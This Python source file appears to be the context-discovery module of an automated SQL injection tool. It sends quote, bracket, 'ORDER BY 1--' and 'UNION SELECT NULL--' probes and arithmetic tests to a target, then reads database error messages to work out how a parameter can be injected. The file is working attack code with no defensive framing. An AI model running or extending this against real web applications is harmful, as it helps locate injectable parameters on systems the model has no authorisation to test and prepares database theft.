import random
import re

class ContextDiscoverer:
    def __init__(self, client):
        self.client = client
        self.probes = [
            {"name": "single_quote", "payload": "'", "weight": 1.0},
            {"name": "double_quote", "payload": "\"", "weight": 1.0},
            {"name": "bracket_single", "payload": "')", "weight": 1.0},
            {"name": "bracket_double", "payload": "\")", "weight": 1.0},
            {"name": "order_by", "payload": " ORDER BY 1--", "weight": 1.0},
            {"name": "union_probe", "payload": " UNION SELECT NULL--", "weight": 1.0},
        ]
        self.detected_context = "UNKNOWN"

    def discover(self):
        print("[*] Phase: Context Discovery (The Eye) active.", flush=True)
        
        # 1. Baseline Request
        baseline = self.client.send_request("")
        baseline_len = len(baseline['text'])
        
        # 2. Inference Logic: Numeric vs String
        # Probe: Arithmetic (Subtle)
        print("  [?] Probing: Numeric Inference (1+0)...", flush=True)
        num_probe = self.client.send_request("1+0")
        if len(num_probe['text']) == baseline_len and num_probe['status'] == 200:
            print("  [?] Probing: Numeric Verification (1+1)...", flush=True)
            num_verify = self.client.send_request("1+1")
            if len(num_verify['text']) == baseline_len:
                self.detected_context = "NUMERIC"
                print(f"[+] Discovery Complete. Detected Context: {self.detected_context} (Inferred via Arithmetic)", flush=True)
                return self.detected_context

        # 3. Inference Logic: Quote Detection (Subtle)
        # Instead of just ', we use a balanced pair or a simple break
        print("  [?] Probing: Quote Inference (')...", flush=True)
        sq_probe = self.client.send_request("'")
        if self._check_sql_errors(sq_probe['text']):
            self.detected_context = "SINGLE_QUOTE"
        else:
            print("  [?] Probing: Quote Inference (\")...", flush=True)
            dq_probe = self.client.send_request("\"")
            if self._check_sql_errors(dq_probe['text']):
                self.detected_context = "DOUBLE_QUOTE"
            else:
                self.detected_context = "GENERIC"

        print(f"[+] Discovery Complete. Detected Context: {self.detected_context}", flush=True)
        return self.detected_context

    def _check_sql_errors(self, text):
        error_patterns = [
            r"SQL syntax", r"mysql_fetch", r"ORA-", r"PostgreSQL", r"SQLite", r"syntax error"
        ]
        for pattern in error_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False
